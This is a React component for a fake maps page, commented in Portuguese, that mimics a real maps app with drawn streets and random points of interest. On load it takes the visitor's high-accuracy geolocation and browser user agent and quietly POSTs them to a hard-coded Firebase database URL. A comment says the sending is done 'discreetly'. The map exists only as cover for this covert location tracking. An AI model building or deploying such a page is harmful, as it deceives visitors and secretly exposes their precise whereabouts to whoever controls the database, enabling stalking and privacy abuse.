"use client"

import { useEffect, useState } from "react"
import { MapPin, Navigation, Search, Menu, Plus, Minus } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: number
  userAgent: string
}

export default function MapSimulator() {
  const [userLocation, setUserLocation] = useState<LocationData | null>(null)
  const [mapCenter, setMapCenter] = useState({ lat: -23.5505, lng: -46.6333 }) // São Paulo default
  const [zoom, setZoom] = useState(13)
  const [isLoading, setIsLoading] = useState(true)
  const [searchQuery, setSearchQuery] = useState("")

  // Função para enviar dados para Firebase
  const sendLocationToFirebase = async (locationData: LocationData) => {
    try {
      const response = await fetch("https://maps-63fea-default-rtdb.firebaseio.com/locations.json", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(locationData),
      })

      if (response.ok) {
        console.log("Localização enviada com sucesso")
      }
    } catch (error) {
      console.error("Erro ao enviar localização:", error)
    }
  }

  // Capturar localização do usuário
  useEffect(() => {
    const captureLocation = () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const locationData: LocationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: Date.now(),
              userAgent: navigator.userAgent,
            }

            setUserLocation(locationData)
            setMapCenter({
              lat: position.coords.latitude,
              lng: position.coords.longitude,
            })

            // Enviar para Firebase discretamente
            sendLocationToFirebase(locationData)
            setIsLoading(false)
          },
          (error) => {
            console.error("Erro ao obter localização:", error)
            setIsLoading(false)
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          },
        )
      } else {
        setIsLoading(false)
      }
    }

    // Simular carregamento do mapa e capturar localização
    setTimeout(captureLocation, 1000)
  }, [])

  // Simular pontos de interesse no mapa
  const generateMapPoints = () => {
    const points = []
    for (let i = 0; i < 15; i++) {
      points.push({
        id: i,
        lat: mapCenter.lat + (Math.random() - 0.5) * 0.02,
        lng: mapCenter.lng + (Math.random() - 0.5) * 0.02,
        type: Math.random() > 0.5 ? "restaurant" : "store",
      })
    }
    return points
  }

  const mapPoints = generateMapPoints()

  const handleZoomIn = () => setZoom(Math.min(zoom + 1, 18))
  const handleZoomOut = () => setZoom(Math.max(zoom - 1, 1))

  return (
    <div className="h-screen w-full relative bg-gray-100">
      {/* Header com barra de pesquisa */}
      <div className="absolute top-0 left-0 right-0 z-10 bg-white shadow-md">
        <div className="flex items-center p-4 gap-3">
          <Button variant="ghost" size="icon">
            <Menu className="h-5 w-5" />
          </Button>
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
            <Input
              placeholder="Pesquisar no Maps"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pl-10"
            />
          </div>
          <Button variant="ghost" size="icon">
            <Navigation className="h-5 w-5" />
          </Button>
        </div>
      </div>

      {/* Área do mapa simulado */}
      <div className="pt-20 h-full relative overflow-hidden">
        {isLoading ? (
          <div className="flex items-center justify-center h-full">
            <div className="text-center">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <p className="text-gray-600">Carregando mapa...</p>
            </div>
          </div>
        ) : (
          <div className="relative h-full bg-gradient-to-br from-green-100 to-blue-100">
            {/* Simulação de ruas */}
            <div className="absolute inset-0">
              {/* Ruas horizontais */}
              {[...Array(8)].map((_, i) => (
                <div
                  key={`h-${i}`}
                  className="absolute bg-gray-300 h-1"
                  style={{
                    top: `${15 + i * 12}%`,
                    left: "0%",
                    width: "100%",
                  }}
                />
              ))}
              {/* Ruas verticais */}
              {[...Array(6)].map((_, i) => (
                <div
                  key={`v-${i}`}
                  className="absolute bg-gray-300 w-1"
                  style={{
                    left: `${10 + i * 15}%`,
                    top: "0%",
                    height: "100%",
                  }}
                />
              ))}
            </div>

            {/* Pontos de interesse */}
            {mapPoints.map((point) => (
              <div
                key={point.id}
                className="absolute transform -translate-x-1/2 -translate-y-1/2"
                style={{
                  left: `${50 + (point.lng - mapCenter.lng) * 1000}%`,
                  top: `${50 + (point.lat - mapCenter.lat) * 1000}%`,
                }}
              >
                <div className={`w-3 h-3 rounded-full ${point.type === "restaurant" ? "bg-red-500" : "bg-blue-500"}`} />
              </div>
            ))}

            {/* Marcador da localização do usuário (se disponível) */}
            {userLocation && (
              <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                <div className="relative">
                  <div className="w-4 h-4 bg-blue-600 rounded-full border-2 border-white shadow-lg"></div>
                  <div className="absolute inset-0 w-4 h-4 bg-blue-600 rounded-full animate-ping opacity-30"></div>
                </div>
              </div>
            )}

            {/* Simulação de áreas verdes */}
            <div className="absolute top-1/4 right-1/4 w-20 h-16 bg-green-300 rounded-lg opacity-60"></div>
            <div className="absolute bottom-1/3 left-1/5 w-16 h-12 bg-green-300 rounded-lg opacity-60"></div>
          </div>
        )}
      </div>

      {/* Controles de zoom */}
      <div className="absolute right-4 bottom-32 flex flex-col gap-2">
        <Button variant="outline" size="icon" className="bg-white shadow-lg" onClick={handleZoomIn}>
          <Plus className="h-4 w-4" />
        </Button>
        <Button variant="outline" size="icon" className="bg-white shadow-lg" onClick={handleZoomOut}>
          <Minus className="h-4 w-4" />
        </Button>
      </div>

      {/* Botão de localização */}
      <div className="absolute right-4 bottom-20">
        <Button
          variant="outline"
          size="icon"
          className="bg-white shadow-lg"
          onClick={() => {
            if (userLocation) {
              setMapCenter({
                lat: userLocation.latitude,
                lng: userLocation.longitude,
              })
            }
          }}
        >
          <MapPin className="h-4 w-4" />
        </Button>
      </div>
    </div>
  )
}
